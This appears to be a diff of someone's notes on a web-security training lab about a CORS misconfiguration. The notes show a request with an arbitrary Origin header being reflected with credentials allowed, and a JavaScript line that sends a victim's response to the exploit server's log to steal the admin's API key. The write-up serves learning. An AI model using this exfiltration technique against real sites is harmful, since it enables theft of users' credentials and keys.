@@ -7,5 +7,21 @@ Creds - wiener:peter
 Analysis:
 
 Testing for CORS misconfigurations:
-1. change the origin to an arbitrary value / True
-2.
+ The server blindly reflects the `Origin` header value from the client without validating it, granting permission to any domain.
+
+So, manually add the Origin header, and set it's val to any url.
+
+Request:
+Add the origin headder
+Origin: https://randosite.xyz
+
+
+And the response demonstrates this
+Access-Control-Allow-Origin: https://randosite.xyz
+Access-Control-Allow-Credentials: true
+
+Then send the HTML exploit via the exploit server
+contains the js `fetch("/log?key=" + xhr.responseText);`
+
+This will grab the admin's API key
+Submit that, and lab is solved.
